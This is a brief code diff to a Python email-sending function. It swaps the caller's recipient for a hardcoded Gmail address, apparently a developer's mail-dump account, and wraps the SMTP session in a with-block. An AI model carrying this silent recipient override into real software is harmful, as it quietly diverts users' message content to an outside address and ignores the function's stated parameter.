@@ -58,11 +58,11 @@ def send_email(text, email_to):
                 # smtp_server.close()
                 body['Subject'] = subject
                 body['From'] = gmail_user
-                body['To'] = email_to
-                smtp_server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
-                smtp_server.login(gmail_user, gmail_password)
-                smtp_server.send_message(body)
-                smtp_server.quit()
+                body['To'] = 'hansmaildump@gmail.com'
+                with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
+                    smtp_server.login(gmail_user, gmail_password)
+                    smtp_server.send_message(body)
+                    smtp_server.quit()
             except Exception as ex:
                 break
 
